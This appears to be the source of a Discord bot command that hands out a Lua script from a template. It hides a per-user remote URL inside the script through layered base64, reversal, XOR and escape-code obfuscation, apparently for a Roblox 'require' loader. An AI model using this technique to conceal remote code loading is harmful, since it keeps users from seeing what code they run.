const { 
    SlashCommandBuilder,
    AttachmentBuilder
} = require('discord.js');
const noblox = require('noblox.js')

function convertToLuauString(str) {
  let luauString = "";
  for (let i = 0; i < str.length; i++) {
    const char = str[i];
    const charCode = char.charCodeAt(0);
    luauString += "\\" + charCode.toString();
  }
  return luauString;
}

function reverseString(str) {
    var splitString = str.split("");
    var reverseArray = splitString.reverse();
    var joinArray = reverseArray.join("");

    return joinArray;
}


function xorEncode(inputString, key) {
  let encodedString = '';
  
  for (let i = 0; i < inputString.length; i++) {
    const charCode = inputString.charCodeAt(i);
    const encodedChar = String.fromCharCode(charCode ^ (key || 42)); // XOR operation
    
    encodedString += encodedChar;
  }
  
  return encodedString;
}

module.exports.data = new SlashCommandBuilder()
	.setName('require')
	.setDescription('Gives the require for doqium.')
    .setDMPermission(false)

const fs = require('fs')
const path = require('path')
const {v4: uuidv4} = require('uuid')

const {makekey: makeNewKey} = require('../index.js')

module.exports.execute = (bot, inter) => {
    if(!inter.member.roles.cache.get('1124555979158204416')) return message.reply(`You do not have permission to global ban.`);

    makeNewKey('9e9 1.3511471545562614e+136').then((urlid) => {
        let id = uuidv4().replaceAll("-", "")
        let obfid = Math.floor(Math.random() * 100) + 1
        let code = fs.readFileSync(path.join(__dirname, '../obfscode.lua')).toString().replaceAll('__website__', convertToLuauString(xorEncode(reverseString(Buffer.from(`https://i-am-not.doqe.dev/req/${urlid}`, 'utf8').toString('base64')), obfid))).replaceAll('__decodekey__', obfid)

        fs.writeFile(path.join(__dirname, '../temp/' + id + '.lua'), code, (err) => {
            if(err) return console.error(err)

            const att = new AttachmentBuilder('./temp/' + id + '.lua')
        
            inter.reply({ephemeral: true, files: [att]}).then(() => {
                fs.unlinkSync(path.join(__dirname, '../temp/' + id + '.lua'))
            })
        })
    })
}